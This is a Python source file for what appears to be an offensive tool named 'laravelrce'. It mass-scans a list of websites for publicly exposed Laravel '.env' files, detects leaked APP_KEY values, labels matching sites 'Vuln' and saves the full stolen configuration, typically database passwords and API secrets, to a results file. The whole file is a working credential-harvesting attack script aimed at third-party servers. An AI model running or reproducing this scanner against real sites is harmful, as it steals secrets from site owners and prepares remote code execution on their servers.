from laravelrce.packages import *
from laravelrce.banner import *

class LaravelRceCheck:

   def __init__(self, url):
      global console
      console = Console()
      os.system('clear')
      
      pretty.install()
      self.date = timezone('Asia/Jakarta').localize(datetime.now())

      global banner
      self.banner = Banners() 
      self.url = open(url).readlines()


   def save_to_file(self,nameFile,x):
      kl = open(nameFile, 'a+')
      kl.write(x)
      kl.close()


   
   def validation(self):
      
      links = []
      for myLink in self.url:

         link = myLink.split("/")
         count = len(link)
         if count == 3:
             links = "".join(link[2]+"/.env")
         elif count ==4:
             links = "".join(link[2]+"/.env")
         else:
             links = "".join(link)
         
         yield links

      
   def check(self):
       
       console = Console()

       count = len(self.url)
       i = 0
       for urls in self.validation():
           
           
           
              
           s = requests.Session()
           cookie = s.cookies.get_dict()
           header= {'User-Agent':'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0'}
           try:
              r = s.get("http://"+urls, headers=header, cookies=cookie)
              
              appKey = re.findall('APP_KEY=([^"\n]+)', r.text)
              key = re.findall('APP_KEY', r.text)
              


              
              #date = datetime.date.today()
              if appKey:
                 
                 i += 1
                 live = "[red][ {} ][/red] [blue][ {}/{} ] [/blue][yellow]http://{}[/yellow][cyan] =>[/cyan] [green]Vuln[/green]".format(self.date.today().strftime('%H:%M:%m:%d:%Y'), i, count, urls)
                 console.print(live.replace("\n", ""))
                 
                 self.save_to_file('Rezult/Config/Config.txt', r.text)
                 time.sleep(1)
              else:
              
                 i += 1
                 nvuln = "[red][ {} ][/red] [blue][ {}/{} ] [/blue][yellow]http://{}[/yellow][cyan] =>[/cyan] [red]Not Vuln[/red]".format(self.date.today().strftime('%H:%M:%m:%d:%Y'), i, count, urls)
                 console.print(nvuln.replace("\n", ""))
                 time.sleep(1)
                 

           except requests.exceptions.MissingSchema:
               i += 1
               miss = "[red][ {} ][/red] [blue][ {}/{} ] [/blue][yellow]http://{}[/yellow][cyan] =>[/cyan] [red] Error [ Please put valid url. ex http://url.com in your txt file ][/red]".format(self.date.today().strftime('%H:%M:%m:%d:%Y'), i, count, urls)
               console.print(miss.replace("\n", ""))
               time.sleep(1)
               continue
                                             
                                             
                                             
                                             
           except requests.exceptions.ConnectionError:
               i += 1
               err = "[red][ {} ][/red] [blue][ {}/{} ] [/blue][yellow]http://{}[/yellow][cyan] =>[/cyan] [red]Error URL is die[/red]".format(self.date.today().strftime('%H:%M:%m:%d:%Y'), i, count, urls)
               console.print(err.replace("\n", ""))  
               time.sleep(1)
               continue
